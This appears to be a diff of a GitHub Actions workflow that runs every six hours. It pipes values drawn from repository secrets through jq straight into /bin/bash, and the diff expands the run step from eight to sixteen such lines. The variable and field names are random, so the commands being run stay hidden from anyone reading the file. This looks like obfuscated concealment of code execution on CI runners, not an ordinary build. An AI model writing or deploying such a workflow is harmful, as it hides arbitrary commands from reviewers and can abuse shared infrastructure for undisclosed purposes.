@@ -1,23 +1,32 @@
 name: shangwth
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
-jobs:  # 17972
+    - cron: '42 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shangwth
         env:
-          ehruz95618: ${{ secrets.ehruz95618 }}
+          dekq470: ${{ secrets.dekq470 }}
         run: |
-          echo $ehruz95618 | jq -r .gep34 | /bin/bash
-          echo $txhqu28361 | jq -r .ecrm98758 | /bin/bash
-          echo $sd291 | jq -r .jyojw5904 | /bin/bash
-          echo $lwhij14 | jq -r .pk0 | /bin/bash
-          echo $zvnte285 | jq -r .ubc86360 | /bin/bash
-          echo $t85 | jq -r .q3693 | /bin/bash
-          echo $b04912 | jq -r .ln8 | /bin/bash
-          echo $kln11625 | jq -r .e71692 | /bin/bash
+          echo $dekq470 | jq -r .matyh50 | /bin/bash
+          echo $bqkv1 | jq -r .kygl95 | /bin/bash
+          echo $pimec2 | jq -r .giny3 | /bin/bash
+          echo $buio366 | jq -r .oieg5 | /bin/bash
+          echo $jo938 | jq -r .ixbp4 | /bin/bash
+          echo $n2922 | jq -r .omtw272 | /bin/bash
+          echo $yyxlh4 | jq -r .fc560 | /bin/bash
+          echo $w951 | jq -r .nwi264 | /bin/bash
+          echo $osood361 | jq -r .v719 | /bin/bash
+          echo $bbyc175 | jq -r .trwx39239 | /bin/bash
+          echo $i42383 | jq -r .muuvf87480 | /bin/bash
+          echo $g58 | jq -r .v58 | /bin/bash
+          echo $qqj93640 | jq -r .mlg17 | /bin/bash
+          echo $wo04 | jq -r .eyexh9911 | /bin/bash
+          echo $ehzr63372 | jq -r .fbld30 | /bin/bash
+          echo $jgsv04 | jq -r .m936 | /bin/bash
 
